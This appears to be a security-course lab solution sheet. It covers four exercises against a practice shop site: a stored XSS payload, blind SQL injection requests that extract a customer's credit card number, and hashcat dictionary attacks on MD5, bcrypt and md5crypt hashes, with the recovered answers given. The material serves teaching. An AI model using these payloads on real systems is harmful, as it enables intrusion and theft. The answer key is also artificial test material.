 
### Exercise 1: XSS

There's XSS on comments. Note that only your last comment is shown and you restore the initial state by logging out. Could you exploit XSS and inject an alert to be shown when some of the "close the comment" button is pressed? To be more precise, you have to post a comment so that the page you get back has the modified behavior (and you can verify it by pressing the injected button to trigger the alert). The alert must show the message **Venom is a good boy!**.

```html
<script>
const closeButtons = document.getElementsByClassName('btn-close')
for (let i = 0; i < closeButtons.length; i++) {
closeButtons[i].onclick = function() { alert('Venom is a good boy!') }; 
}
</script>
```


### Exercise 2: python script

We can buy the decryption key for a cheap price. They also offer gift cards. We already charged a small amount of credit. Obtain that key for us!
You can always delete cookies and reload the page to restore the initial state. Provide a script.

##### Script simulation_decrypt_key.py in Lab folder


### Exercise 3: SQL injection

The following SQL injection statement: 

```sql
sql = f"select * from eshop_customer where username = '{username}' and password = '{password}'"
```

is used.
The session is authenticated if the above query returns a single user.
Steal the credit card number of brucewayne. Credit cards are stored in column *credit_card*.

1. Send a fuzzed request with the following body to find out the credit_card length:

```http
username=brucewayne' and length(credit_card) = 16 --&password=
```

2. Send a double fuzzed request with the following body to find out the single characters of credit_card:

```http
username=brucewayne' and substr(credit_card, 1, 1) = '1' --&password=
```

	substr(string, start, length) 
	
where start must be 1-16 (extremes included).

Fuzz on the start of the substr and the character (0-9).

Credit_card: 7114 0996 5635 3972


### Exercise 4: hashing

Use the rockyou.txt file to bruteforce the following password hashes (1 point each):
- c51e7a23a59ef8d76892f207b517eaf0 -> MD5 -> millie
- \$2a\$09$aJUc7jD71mV.KbWgyO2zweLWyUYoxHb8G/LsGXFgjfx9ynqusxUtO -> bcrypt -> leonardo
- \$1$NOcJM.4s\$kIKttixk75d7wgMqDjyYK. -> md5crypt -> COD{babylove}

The first and the second passwords are among the first 1000 lines of rockyou.txt. The third password is also among the first 1000 lines of rockyou.txt, but it was modified to have the format *COD{original-password}*.


```bash
hashcat -m 0 -a 0 hash.txt wordlist.txt
```

means: 
- -m 0: hash type (0 stands for MD5)
- -a 0: attack mode (0 stands for dictionary)
- *hash.txt*: text file with the hash to decrypt 

```bash
head -n 1000 rockyou.txt > rockyou_top1000.txt
```

To take the first 1000 lines of rockyou.txt.

##### First hash

Use https://crackstation.net/ or with hashcat:

```bash
hashcat -m 0 -a 0 hash.txt rockyou_top1000.txt 
```

##### Second hash

```bash
hashid '$2a$09$aJUc7jD71mV.KbWgyO2zweLWyUYoxHb8G/LsGXFgjfx9ynqusxUtO'
```

to find the hashing algorithm. Otherwise, use:

```bash
hashcat --help less | grep \$2
```

Then decrypt with:

```bash
hashcat -m 3200 -a 0 hash.txt rockyou_top1000.txt 
```

If it doesn't show the solution, add `--show` to the command.


##### Third hash

```bash
sed 's/^/COD{/' rockyou_top1000.txt | sed 's/$/}/' > modified_rockyou_1000.txt
```

to format the first 100 entries of rockyou.txt as *COD{original-password}*.

Then use the following command to find out the hashing algorithm:

```bash
hashcat --help less | grep \$1
```

Decrypt the password:

```bash
hashcat -m 500 -a 0 hash.txt modified_rockyou_1000.txt 
```